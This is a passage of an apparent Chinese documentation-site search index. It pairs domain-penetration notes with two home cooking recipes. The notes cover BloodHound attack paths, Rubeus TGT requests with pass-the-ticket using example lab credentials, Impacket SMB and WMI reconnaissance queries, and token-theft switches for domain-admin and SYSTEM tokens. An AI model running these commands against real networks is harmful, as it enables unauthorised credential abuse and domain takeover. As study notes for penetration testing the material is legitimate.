all","title":"\u641c\u96c6\u4fe1\u606f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_77","text":"\u5de6\u4fa7\u4f1a\u663e\u793a\u8be5\u5bf9\u8c61\u7684\u5404\u79cd\u4fe1\u606f","title":"\u5206\u6790\u4fe1\u606f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_78","text":"\u7ed9\u5b9a\u4e00\u4e2a\u8d77\u70b9\uff0c\u4e00\u4e2a\u7ec8\u70b9\uff0cBH\u4f1a\u81ea\u52a8\u4e3a\u4f60\u8ba1\u7b97\u653b\u51fb\u8def\u5f84\u3002 \u5982\u4e0b\u56fe\u6570\u636e\u5bfc\u5165\u5b8c\u6210\u3002\u53f3\u4fa7\u662f\u57df\u7ba1\uff0c\u6211\u4eec\u7684\u6700\u7ec8\u76ee\u6807\uff0c\u5de6\u4fa7\u662f\u5bf9\u57df\u7ba1\u7ec4\u6709memberoff\u6743\u9650\u7684\uff0c\u610f\u601d\u5c31\u662f\u53ef\u4ee5\u968f\u610f\u52a0\u7528\u6237\u5230\u57df\u7ba1\u7684\u6743\u9650\u3002\u8fd9\u4e9b\u7528\u6237\u4e00\u822c\u81ea\u5df1\u5c31\u662f\u57df\u7ba1\u3002 \u5982\u6211\u4eec\u6ca1\u6709\u5de6\u4fa7\u7528\u6237\u7684\u6743\u9650\uff0c\u53ef\u4ee5\u53f3\u952e\u8bbe\u7f6e\u4ee5\u8be5\u7528\u6237\u4e3a\u76ee\u6807 \u5de6\u4e0a\u65b9\u53ef\u4ee5\u8f93\u5165\u5df2\u7ecf\u6709\u6743\u9650\u7684\u666e\u901a\u8d26\u53f7 \u7136\u540e\u653b\u51fb\u8def\u5f84\u5c31\u51fa\u6765\u4e86\u3002 \u770b\u8d77\u6765\u5f88\u4e71\uff0c\u4f46\u5e76\u975e\u5982\u6b64\u3002 canrdp\uff0c\u6307\u7528\u6237\u53ef\u4ee5\u767b\u5f55\u7684\u673a\u5668 has session\uff0c\u6307\u8be5\u673a\u5668\u5b58\u6709\u53f3\u4fa7\u7528\u6237\u7684\u4f1a\u8bdd\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7a83\u53d6token\u6216\u5bc6\u7801 \u5f53\u4e0d\u77e5\u9053\u8fd9\u4e00\u6b65\u9aa4\u662f\u4ec0\u4e48\u610f\u601d\u6216\u5982\u4f55\u5229\u7528\u65f6\uff0c\u53ef\u4ee5\u53f3\u952e\u770b\u4e00\u4e0bhelp\uff0c\u8d34\u5fc3\u7684\u662f\uff0cBH\u751a\u81f3\u5e2e\u4f60\u628a\u811a\u672c\u4e0e\u89c6\u9891\u6559\u7a0b\u90fd\u5217\u4e3e\u51fa\u6765\u4e86\u3002","title":"\u8ba1\u7b97\u653b\u51fb\u8def\u5f84"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#rubeus","text":"","title":"Rubeus"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#asktgt","text":"\u7528\u6765\u8bf7\u6c42tgt\u7968\u636e\uff0c\u53ef\u4ee5\u4f7f\u7528\u660e\u6587\u6216\u5404\u79cd\u7c7b\u578bhash","title":"asktgt\u6a21\u5757"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_79","text":"Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] \u5b9e\u4f8b rubeus asktgt /user:administrator /password:Aa123123.. /domain:exp1.com /dc:192.168.14.100 /ptt","title":"\u7533\u8bf7\u7968\u636e"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#tgt_1","text":"Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\\Windows\\System32\\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec] [/nopac] \u5b9e\u4f8b rubeus asktgt /user:administrator /password:Aa123123.. /domain:exp1.com /dc:192.168.14.100 /createnetonly:C:\\a.exe","title":"\u5229\u7528\u7533\u8bf7\u7684tgt\u6765\u6267\u884c\u7a0b\u5e8f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#impacket_2","text":"\u642d\u4e00\u4e2asmb\u670d\u52a1 python3 smbserver.py share / -smb2support \u4f7f\u7528WQL\u67e5\u8be2 python3 wmiquery.py exp1/administrator:Aa123123..@192.168.14.100 \u67e5\u8be2IP Select IPAddress,Description,DefaultIPGateway,IPSubnet,DNSHostName,DNSDomain,MACAddress from Win32_NetworkAdapterConfiguration \u67e5\u8be2\u57df\u4fe1\u606f WQL> select Name,Domain,DomainRole,UserName from Win32_ComputerSystem | Domain | DomainRole | Name | UserName | | exp1.com | 5 | DC | EXP1\\Administrator | \u57df\u89d2\u8272\uff1a0-1\u662fPC\uff0c2-3\u662fServer\uff0c4-5\u662f\u57df\u63a7 \u67e5\u8be2\u7ec4\u4fe1\u606f select * from Win32_Group \u67e5\u8be2\u81ea\u542f\u52a8\u9879\u76ee select * from Win32_StartupCommand ping\u4e00\u4e2a\u5730\u5740 \u5bf9\u6bd4\u53d1\u5305\u548c\u8fd4\u56de\u5305\u7684\u5927\u5c0f\u6765\u786e\u5b9a\u662f\u5426ping\u901a WQL> Select BufferSize,ReplySize from Win32_PingStatus where Address = '192.168.14.2' | BufferSize | ReplySize | | 32 | 32 | \u67e5\u8be2\u8fdb\u7a0b Select Name,ProcessId,ExecutablePath from Win32_Process","title":"Impacket\u811a\u672c\u8bf4\u660e"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_80","text":"","title":"\u53c2\u8003"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#useraccountcontrol","text":"\u6765\u6e90http://woshub.com/decoding-ad-useraccountcontrol-value/ \u81ea\u5df1\u7ffb\u8bd1\u7684\uff0c\u53ef\u80fd\u4e0d\u592a\u5bf9 | SCRIPT | 1 | \u8fd0\u884c\u767b\u5f55\u811a\u672c | |:------------------------------:| -------- | ----------------- | | ACCOUNTDISABLE | 2 | \u8d26\u53f7\u5df2\u7981\u7528 | | HOMEDIR_REQUIRED | 8 | \u4f9d\u8d56\u5bb6\u76ee\u5f55 | | LOCKOUT | 16 | \u8d26\u6237\u5df2\u9501\u5b9a | | PASSWD_NOTREQD | 32 | \u4e0d\u9700\u5bc6\u7801 | | PASSWD_CANT_CHANGE | 64 | \u7528\u6237\u4e0d\u80fd\u66f4\u6539\u5bc6\u7801 | | ENCRYPTED_TEXT_PWD_ALLOWED | 128 | \u4f7f\u7528\u53ef\u9006\u52a0\u5bc6\u5b58\u50a8\u5bc6\u7801 | | TEMP_DUPLICATE_ACCOUNT | 256 | \u7528\u6237\u7684\u5e10\u6237\uff0c\u5176\u4e3b\u8981\u5e10\u6237\u5728\u53e6\u4e00\u4e2a\u57df\u4e2d | | NORMAL_ACCOUNT | 512 | \u9ed8\u8ba4\u5e10\u6237\uff0c\u5178\u578b\u7684\u6d3b\u52a8\u5e10\u6237 | | INTERDOMAIN_TRUST_ACCOUNT | 2048 | \u57df\u95f4\u4fe1\u4efb | | WORKSTATION_TRUST_ACCOUNT | 4096 | \u5de5\u4f5c\u7ec4\u4fe1\u4efb | | SERVER_TRUST_ACCOUNT | 8192 | \u670d\u52a1\u5668\u4fe1\u4efb | | DONT_EXPIRE_PASSWORD | 65536 | \u5bc6\u7801\u672a\u8fc7\u671f\u7684\u7528\u6237\u5e10\u6237 | | MNS_LOGON_ACCOUNT | 131072 | \u8981\u767b\u5f55\u7f51\u7edc\uff0c\u7528\u6237\u9700\u8981\u667a\u80fd\u5361 | | SMARTCARD_REQUIRED | 262144 | \u9700\u8981\u667a\u80fd\u5361 | | TRUSTED_FOR_DELEGATION | 524288 | \u975e\u7ea6\u675f\u59d4\u6d3e | | NOT_DELEGATED | 1048576 | | | USE_DES_KEY_ONLY | 2097152 | \u4ec5\u4f7f\u7528DES\u5bc6\u7801 | | DONT_REQ_PREAUTH | 4194304 | \u4e0d\u9700\u8981Kerberos\u9884\u8eab\u4efd\u9a8c\u8bc1 | | PASSWORD_EXPIRED | 8388608 | \u7528\u6237\u5bc6\u7801\u5df2\u8fc7\u671f | | TRUSTED_TO_AUTH_FOR_DELEGATION | 16777216 | \u7ea6\u675f\u59d4\u6d3e | | PARTIAL_SECRETS_ACCOUNT | 67108864 | \u53d7\u4fdd\u62a4\u7684\u8d26\u6237 |","title":"UserAccountControl\u503c\u53c2\u8003\u8868"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#ace","text":"| \u7f29\u5199 | \u5168\u79f0 | \u610f\u4e49 | | ------------- |:------------- | --- | | FC | full rights | \u6240\u6709 | | CR CHILD | create child | \u65b0\u5efa | | DEL CHILD | delete child | \u5220\u9664 | | LIST CHILDREN | list children | \u67e5\u770b | | SELF WRT | | \u5199\u5165 | | READ PROP | | \u8bfb | | | | | \u540e\u7eed\u518d\u8865\u5145\u8865\u5145\u3002 /id\uff1a\u6307\u5b9a\u76ee\u6807token\u7684TokenID /domainadmin\uff1a\u7a83\u53d6\u57df\u7ba1\u7684token /enterpriseadmin\uff1a\u7a83\u53d6\u4f01\u4e1a\u7ba1\u7406\u5458\u7684token /admin\uff1a\u7a83\u53d6\u672c\u5730\u7ba1\u7406\u5458\u7684token /localservice\uff1a\u7a83\u53d6Local Service\u6743\u9650\u7684token /networkservice\uff1a\u7a83\u53d6Network Service\u6743\u9650\u7684token /system\uff1a\u7a83\u53d6SYSTEM\u6743\u9650\u7684token","title":"\u666e\u901aACE\u7684\u7f29\u5199\u53c2\u8003"},{"location":"%E8%8F%9C%E8%B0%B1/%E8%AE%A9%E8%87%AA%E5%88%B6%E7%81%AB%E9%94%85%E6%9B%B4%E5%A5%BD%E5%90%83/","text":"\u5e8f\u8a00 \u81ea\u5df1\u5728\u5bb6\u5403\u706b\u9505\u90fd\u4f1a\u7528\u5230\u706b\u9505\u5e95\u6599\uff0c\u7b2c\u4e00\u6b21\u5403\u8fd8\u884c\uff0c\u4f46\u662f\u6b21\u6570\u5403\u591a\u4e86\u5c31\u4f1a\u611f\u89c9\u5473\u9053\u6709\u70b9\u817b\u3002\u8fd9\u7bc7\u6587\u7ae0\u6559\u4f60\u5982\u4f55\u8ba9\u706b\u9505\u66f4\u597d\u5403\u3002 \u6750\u6599\u51c6\u5907 \u706b\u9505\u5e95\u6599\u4e00\u5305 \u751f\u59dc \u5927\u8471 \u9171\u6cb9\uff08\u751f\u62bd\u8001\u62bd\uff09 \u8017\u6cb9 \u76d0 \u5927\u6599(\u516b\u89d2\u3001\u6842\u76ae\u5fc5\u5907\uff0c\u5176\u4ed6\u9999\u6599\u60f3\u653e\u4ec0\u4e48\u653e\u4ec0\u4e48) \u5e72\u8fa3\u6912\uff08\u8fa3\u7684\u548c\u4e0d\u8fa3\u7684\u6700\u597d\u90fd\u51c6\u5907\uff0c\u8fa3\u7684\u5e72\u8fa3\u6912\u662f\u6241\u7684\uff0c\u4e0d\u8fa3\u7684\u662f\u80d6\u7684\uff09 \u82b1\u6912\uff08\u7ea2\u82b1\u6912\u9752\u82b1\u6912\u968f\u610f\uff09 \u51b0\u7cd6\u4e00\u70b9\u70b9 \u90eb\u53bf\u8c46\u74e3\u9171 \u767d\u9152 \u70e7\u4e00\u58f6\u70ed\u6c34 \u52a0\u5de5\u6b65\u9aa4 1\u3001\u9505\u91cc\u5012\u6cb9\u70e7\u70ed\u3002\u53ef\u4ee5\u591a\u70b9\uff0c\u6cb9\u8d8a\u591a\u8d8a\u50cf\u5916\u9762\u7684\u56db\u5ddd\u706b\u9505 2\u3001\u4e0b\u51b0\u7cd6\u7092\u5316\u3002\u4e0d\u8981\u628a\u51b0\u7cd6\u7092\u9ed1\u4e86\u3002 3\u3001\u5728\u51b0\u7cd6\u7a0d\u5fae\u53d8\u9ec4\u65f6(\u81ea\u5df1\u638c\u63e1)\u8d76\u7d27\u6765\u4e00\u52fa\u8c46\u74e3\u9171\u4e0b\u5165 4\u3001\u4e0b\u5165\u59dc\u7247\u3002\u56db\u4e94\u7247\u5207\u539a\u70b9\u3002 5\u3001\u4e0b\u5165\u5927\u6599\u3001\u5e72\u8fa3\u6912\u3001\u82b1\u6912\u7684\u6df7\u5408\u7269\uff0c\u709210\u79d2\uff0c\u7092\u9999\u3002 6\u3001\u5012\u5165\u751f\u62bd\u3001\u8001\u62bd\u3001\u9171\u6cb9\u3001\u4e00\u90e8\u5206\u5927\u8471\u6bb5\uff0c\u8001\u62bd\u53ef\u4ee5\u9002\u5f53\u591a\u6765\u70b9\u3002 7\u3001\u52a0\u76d0\u3001\u52a0\u4e00\u70b9\u767d\u9152\u3002 8\u3001\u52a0\u5165\u4e00\u70b9\u70ed\u6c34\uff0c\u7b49\u9505\u70e7\u4e00\u5206\u949f\uff0c\u70e7\u51fa\u9999\u5473\u3002 9\u3001\u52a0\u5165\u706b\u9505\u5e95\u6599\uff0c\u52a0\u5165\u5168\u90e8\u70ed\u6c34\u3002 10\u3001\u7b49\u706b\u9505\u5e95\u6599\u5168\u90e8\u716e\u5316\u5c31\u53ef\u4ee5\u8f6c\u79fb\u5230\u706b\u9505\u7ee7\u7eed\u70e7\u4e86\u3002 11\u3001\u8f6c\u79fb\u5230\u706b\u9505\u52a0\u5165\u5269\u4e0b\u7684\u5927\u8471\u6bb5\uff0c\u518d\u52a0\u70b9\u5e72\u8fa3\u6912\u3002\u5c31\u53ef\u4ee5\u4e0b\u4e1c\u897f\u5f00\u5403\u4e86 \u8fd9\u6837\u7684\u52a0\u5de5\u7684\u706b\u9505\u5e95\u6599\u6bd4\u539f\u706b\u9505\u5e95\u6599\u66f4\u52a0\u597d\u5403\uff0c\u5473\u9053\u66f4\u52a0\u4e30\u5bcc\u3002","title":"\u8ba9\u81ea\u5236\u706b\u9505\u66f4\u597d\u5403"},{"location":"%E8%8F%9C%E8%B0%B1/%E8%AE%A9%E8%87%AA%E5%88%B6%E7%81%AB%E9%94%85%E6%9B%B4%E5%A5%BD%E5%90%83/#_1","text":"\u81ea\u5df1\u5728\u5bb6\u5403\u706b\u9505\u90fd\u4f1a\u7528\u5230\u706b\u9505\u5e95\u6599\uff0c\u7b2c\u4e00\u6b21\u5403\u8fd8\u884c\uff0c\u4f46\u662f\u6b21\u6570\u5403\u591a\u4e86\u5c31\u4f1a\u611f\u89c9\u5473\u9053\u6709\u70b9\u817b\u3002\u8fd9\u7bc7\u6587\u7ae0\u6559\u4f60\u5982\u4f55\u8ba9\u706b\u9505\u66f4\u597d\u5403\u3002","title":"\u5e8f\u8a00"},{"location":"%E8%8F%9C%E8%B0%B1/%E8%AE%A9%E8%87%AA%E5%88%B6%E7%81%AB%E9%94%85%E6%9B%B4%E5%A5%BD%E5%90%83/#_2","text":"\u706b\u9505\u5e95\u6599\u4e00\u5305 \u751f\u59dc \u5927\u8471 \u9171\u6cb9\uff08\u751f\u62bd\u8001\u62bd\uff09 \u8017\u6cb9 \u76d0 \u5927\u6599(\u516b\u89d2\u3001\u6842\u76ae\u5fc5\u5907\uff0c\u5176\u4ed6\u9999\u6599\u60f3\u653e\u4ec0\u4e48\u653e\u4ec0\u4e48) \u5e72\u8fa3\u6912\uff08\u8fa3\u7684\u548c\u4e0d\u8fa3\u7684\u6700\u597d\u90fd\u51c6\u5907\uff0c\u8fa3\u7684\u5e72\u8fa3\u6912\u662f\u6241\u7684\uff0c\u4e0d\u8fa3\u7684\u662f\u80d6\u7684\uff09 \u82b1\u6912\uff08\u7ea2\u82b1\u6912\u9752\u82b1\u6912\u968f\u610f\uff09 \u51b0\u7cd6\u4e00\u70b9\u70b9 \u90eb\u53bf\u8c46\u74e3\u9171 \u767d\u9152 \u70e7\u4e00\u58f6\u70ed\u6c34","title":"\u6750\u6599\u51c6\u5907"},{"location":"%E8%8F%9C%E8%B0%B1/%E8%AE%A9%E8%87%AA%E5%88%B6%E7%81%AB%E9%94%85%E6%9B%B4%E5%A5%BD%E5%90%83/#_3","text":"1\u3001\u9505\u91cc\u5012\u6cb9\u70e7\u70ed\u3002\u53ef\u4ee5\u591a\u70b9\uff0c\u6cb9\u8d8a\u591a\u8d8a\u50cf\u5916\u9762\u7684\u56db\u5ddd\u706b\u9505 2\u3001\u4e0b\u51b0\u7cd6\u7092\u5316\u3002\u4e0d\u8981\u628a\u51b0\u7cd6\u7092\u9ed1\u4e86\u3002 3\u3001\u5728\u51b0\u7cd6\u7a0d\u5fae\u53d8\u9ec4\u65f6(\u81ea\u5df1\u638c\u63e1)\u8d76\u7d27\u6765\u4e00\u52fa\u8c46\u74e3\u9171\u4e0b\u5165 4\u3001\u4e0b\u5165\u59dc\u7247\u3002\u56db\u4e94\u7247\u5207\u539a\u70b9\u3002 5\u3001\u4e0b\u5165\u5927\u6599\u3001\u5e72\u8fa3\u6912\u3001\u82b1\u6912\u7684\u6df7\u5408\u7269\uff0c\u709210\u79d2\uff0c\u7092\u9999\u3002 6\u3001\u5012\u5165\u751f\u62bd\u3001\u8001\u62bd\u3001\u9171\u6cb9\u3001\u4e00\u90e8\u5206\u5927\u8471\u6bb5\uff0c\u8001\u62bd\u53ef\u4ee5\u9002\u5f53\u591a\u6765\u70b9\u3002 7\u3001\u52a0\u76d0\u3001\u52a0\u4e00\u70b9\u767d\u9152\u3002 8\u3001\u52a0\u5165\u4e00\u70b9\u70ed\u6c34\uff0c\u7b49\u9505\u70e7\u4e00\u5206\u949f\uff0c\u70e7\u51fa\u9999\u5473\u3002 9\u3001\u52a0\u5165\u706b\u9505\u5e95\u6599\uff0c\u52a0\u5165\u5168\u90e8\u70ed\u6c34\u3002 10\u3001\u7b49\u706b\u9505\u5e95\u6599\u5168\u90e8\u716e\u5316\u5c31\u53ef\u4ee5\u8f6c\u79fb\u5230\u706b\u9505\u7ee7\u7eed\u70e7\u4e86\u3002 11\u3001\u8f6c\u79fb\u5230\u706b\u9505\u52a0\u5165\u5269\u4e0b\u7684\u5927\u8471\u6bb5\uff0c\u518d\u52a0\u70b9\u5e72\u8fa3\u6912\u3002\u5c31\u53ef\u4ee5\u4e0b\u4e1c\u897f\u5f00\u5403\u4e86 \u8fd9\u6837\u7684\u52a0\u5de5\u7684\u706b\u9505\u5e95\u6599\u6bd4\u539f\u706b\u9505\u5e95\u6599\u66f4\u52a0\u597d\u5403\uff0c\u5473\u9053\u66f4\u52a0\u4e30\u5bcc\u3002","title":"\u52a0\u5de5\u6b65\u9aa4"},{"location":"%E8%8F%9C%E8%B0%B1/%E9%BA%BB%E8%BE%A3%E9%B8%A1%E4%B8%9D/","text":"\u9ebb\u8fa3\u9e21\u4e1d \u5e8f\u8a00 \u505a\u83dc\u8bb2\u7a76\u7684\u662f\u611f\u89c9 \u6750\u6599\u51c6\u5907 \u9e21\u80f8\u8089\u4e24\u5757\uff0c\u5e72\u8fa3\u6912\uff0c\u82b1\u6912\uff0c\u9ebb\u6912 \u98df\u6750\u5904\u7406 1.\u7b49\u5f85\u9e21\u80f8\u8089\u5316\u51bb\uff0c\u5c06\u9e21\u80f8\u8089\u712f\u6c34\uff0c\u712f\u6c34\u65f6\u95f4\u4e0d\u80fd\u712f\u592a\u77ed\uff0c\u8fd9\u6837\u4f1a\u5bfc\u81f4\u9e21\u80f8\u8089\u6ca1\u529e\u6cd5\u6495\u5f00\uff1b\u4e0d\u80fd\u712f\u592a\u8fc7\uff0c\u8fd9\u6837\u4f1a\u5bfc\u81f4\u9e21\u80f8\u8089\u6495\u7684\u65f6\u5019\u8089\u6495\u70c2\u4e86 2.\u712f\u6c34\u65f6\u51c6\u5907\u5927\u91cf\u5e72\u8fa3\u6912\uff0c \u82b1\u6912\u548c\u9ebb\u6912\u9002\u91cf\u3002\u5e72\u8fa3\u6912\u7528\u526a\u5200\u526a\u6210\u4e1d\u72b6\uff0c\u5c06\u8fa3\u6912\u4ed4\u653e\u5165\u4e00\u4e2a\u5bb9\u5668 3.\u9e21\u80f8\u8089\u712f\u597d\u6c34\u7528\u51c9\u6c34\u6d78\u6ce1\uff0c\u7528\u624b\u6495\u6210\u4e1d\u72b6\uff0c\u5e76\u5c3d\u91cf\u6ca5\u5e72\u6c34 \u98df\u6750\u5236\u4f5c 1.\u9505\u4e2d\u5012\u5165\u51c9\u6cb9\uff0c\u6cb9\u4e0d\u8981\u592a\u5c11\u4e0d\u7136\u9e21\u80f8\u8089\u65e0\u6cd5\u7178\u5e72\u662f\uff0c\u6cb9\u4e0d\u8981\u592a\u591a\uff0c\u4e0d\u7136\u9e21\u4e1d\u70b8\u67af\u4e86\u3002 2.\u5f85\u6cb9\u70e7\u70ed\u2014\u2014\u5927\u69827\u6210\u70ed\u2014\u2014\u4e5f\u5c31\u662f\u9505\u521a\u5f00\u59cb\u5192\u70df\u7684\u65f6\u5019\uff0c\u5012\u5165\u9e21\u4e1d\u3002\u7178\u9e21\u4e1d\u65f6\u7528\u7b77\u5b50\u591a\u6405\u62cc\uff0c\u4e0d\u8981\u8ba9\u9e21\u4e1d\u7c98\u4f4f\u9505\u5e95\u3002\u7b49\u9e21\u4e1d\u7178\u5e72\u2014\u2014\u4e5f\u5c31\u662f\u611f\u89c9\u9e21\u4e1d\u53d8\u8f7b\u4e86\u4e14\u9e21\u4e1d\u989c\u8272\u53d8\u5316\u65f6\u635e\u51fa\uff0c\u5c06\u9e21\u4e1d\u6ca5\u5e72\u6cb9 3.\u9505\u4e2d\u7559\u4e9b\u6cb9\uff0c\u4e0b\u5165\u5b5c\u7136\u7c92\uff0c\u5b5c\u7136\u7c92\u7178\u9999\u4e0b\u5165\u5e72\u8fa3\u6912\u4e1d\u548c\u82b1\u6912\u9ebb\u6912\uff0c\u6293\u4e00\u70b9\u8fa3\u6912\u4ed4\u4e0d\u8981\u592a\u591a\uff0c\u7ffb\u7092\u51fa\u9999\u5473\u540e\u5012\u5165\u751f\u62bd\uff0c\u7ee7\u7eed\u7092\u4e24\u4e0b\u4e0b\u5165\u9e21\u4e1d\u3002 4.\u7ffb\u7092\u9e21\u4e1d\uff0c\u8fd9\u65f6\u5982\u679c\u89c9\u5f97\u9505\u8981\u70e7\u5e72\u4e86\u5c31\u52a0\u4e00\u70b9\u70b9\u51c9\u6c34\u6dcb\u8fb9\u7ee7\u7eed\u7092\uff0c\u7092\u5e72\u4e86\u7ee7\u7eed\u52a0\u70b9\u51c9\u6c34\u7092\uff0c\u6700\u540e\u52a0\u76d0\u548c\u5b5c\u7136\u7c89\u8c03\u5473\uff0c\u7ee7\u7eed\u7092\u5e72\u540e\u53ef\u5173\u706b\uff0c\u7136\u540e\u6492\u70b9\u767d\u829d\u9ebb\u7092\u51e0\u4e0b\u51fa\u9505\u3002","title":"\u9ebb\u8fa3\u9e21\u4e1d"},{"location":"%E8%8F%9C%E8%B0%B1/%E9%BA%BB%E8%BE%A3%E9%B8%A1%E4%B8%9D/#_1","text":"","title":"\u9ebb\u8fa3\u9e21\u4e1d"},{"location":"%E8%8F%9C%E8%B0%B1/%E9%BA%BB%E8%BE%A3%E9%B8%A1%E4%B8%9D/#_2","text":"\u505a\u83dc\u8bb2\u7a76\u7684\u662f\u611f\u89c9","title":"\u5e8f\u8a00"},{"location":"%E8%8F%9C%E8%B0%B1/%E9%BA%BB%E8%BE%A3%E9%B8%A1%E4%B8%9D/#_3","text":"\u9e21\u80f8\u8089\u4e24\u5757\uff0c\u5e72\u8fa3\u6912\uff0c\u82b1\u6912\uff0c\u9ebb\u6912","title":"\u6750\u6599\u51c6\u5907"},{"location":"%E8%8F%9C%E8%B0%B1/%E9%BA%BB%E8%BE%A3%E9%B8%A1%E4%B8%9D/#_4","text":"1.\u7b49\u5f85\u9e21\u80f8\u8089\u5316\u51bb\uff0c\u5c06\u9e21\u80f8\u8089\u712f\u6c34\uff0c\u712f\u6c34\u65f6\u95f4\u4e0d\u80fd\u712f\u592a\u77ed\uff0c\u8fd9\u6837\u4f1a\u5bfc\u81f4\u9e21\u80f8\u8089\u6ca1\u529e\u6cd5\u6495\u5f00\uff1b\u4e0d\u80fd\u712f\u592a\u8fc7\uff0c\u8fd9\u6837\u4f1a\u5bfc\u81f4\u9e21\u80f8\u8089\u6495\u7684\u65f6\u5019\u8089\u6495\u70c2\u4e86 2.\u712f\u6c34\u65f6\u51c6\u5907\u5927\u91cf\u5e72\u8fa3\u6912\uff0c \u82b1\u6912\u548c\u9ebb\u6912\u9002\u91cf\u3002\u5e72\u8fa3\u6912\u7528\u526a\u5200\u526a\u6210\u4e1d\u72b6\uff0c\u5c06\u8fa3\u6912\u4ed4\u653e\u5165\u4e00\u4e2a\u5bb9\u5668 3.\u9e21\u80f8\u8089\u712f\u597d\u6c34\u7528\u51c9\u6c34\u6d78\u6ce1\uff0c\u7528\u624b\u6495\u6210\u4e1d\u72b6\uff0c\u5e76\u5c3d\u91cf\u6ca5\u5e72\u6c34","title":"\u98df\u6750\u5904\u7406"},{"location":"%E8%8F%9C%E8%B0%B1/%E9%BA%BB%E8%BE%A3%E9%B8%A1%E4%B8%9D/#_5","text":"1.\u9505\u4e2d\u5012\u5165\u51c9\u6cb9\uff0c\u6cb9\u4e0d\u8981\u592a\u5c11\u4e0d\u7136\u9e21\u80f8\u8089\u65e0\u6cd5\u7178\u5e72\u662f\uff0c\u6cb9\u4e0d\u8981\u592a\u591a\uff0c\u4e0d\u7136\u9e21\u4e1d\u70b8\u67af\u4e86\u3002 2.\u5f85\u6cb9\u70e7\u70ed\u2014\u2014\u5927\u69827\u6210\u70ed\u2014\u2014\u4e5f\u5c31\u662f\u9505\u521a\u5f00\u59cb\u5192\u70df\u7684\u65f6\u5019\uff0c\u5012\u5165\u9e21\u4e1d\u3002\u7178\u9e21\u4e1d\u65f6\u7528\u7b77\u5b50\u591a\u6405\u62cc\uff0c\u4e0d\u8981\u8ba9\u9e21\u4e1d\u7c98\u4f4f\u9505\u5e95\u3002\u7b49\u9e21\u4e1d\u7178\u5e72\u2014\u2014\u4e5f\u5c31\u662f\u611f\u89c9\u9e21\u4e1d\u53d8\u8f7b\u4e86\u4e14\u9e21\u4e1d\u989c\u8272\u53d8\u5316\u65f6\u635e\u51fa\uff0c\u5c06\u9e21\u4e1d\u6ca5\u5e72\u6cb9 3.\u9505\u4e2d\u7559\u4e9b\u6cb9\uff0c\u4e0b\u5165\u5b5c\u7136\u7c92\uff0c\u5b5c\u7136\u7c92\u7178\u9999\u4e0b\u5165\u5e72\u8fa3\u6912\u4e1d\u548c\u82b1\u6912\u9ebb\u6912\uff0c\u6293\u4e00\u70b9\u8fa3\u6912\u4ed4\u4e0d\u8981\u592a\u591a\uff0c\u7ffb\u7092\u51fa\u9999\u5473\u540e\u5012\u5165\u751f\u62bd\uff0c\u7ee7\u7eed\u7092\u4e24\u4e0b\u4e0b\u5165\u9e21\u4e1d\u3002 4.\u7ffb\u7092\u9e21\u4e1d\uff0c\u8fd9\u65f6\u5982\u679c\u89c9\u5f97\u9505\u8981\u70e7\u5e72\u4e86\u5c31\u52a0\u4e00\u70b9\u70b9\u51c9\u6c34\u6dcb\u8fb9\u7ee7\u7eed\u7092\uff0c\u7092\u5e72\u4e86\u7ee7\u7eed\u52a0\u70b9\u51c9\u6c34\u7092\uff0c\u6700\u540e\u52a0\u76d0\u548c\u5b5c\u7136\u7c89\u8c03\u5473\uff0c\u7ee7\u7eed\u7092\u5e72\u540e\u53ef\u5173\u706b\uff0c\u7136\u540e\u6492\u70b9\u767d\u829d\u9ebb\u7092\u51e0\u4e0b\u51fa\u9505\u3002","title":"\u98df\u6750\u5236\u4f5c"}]}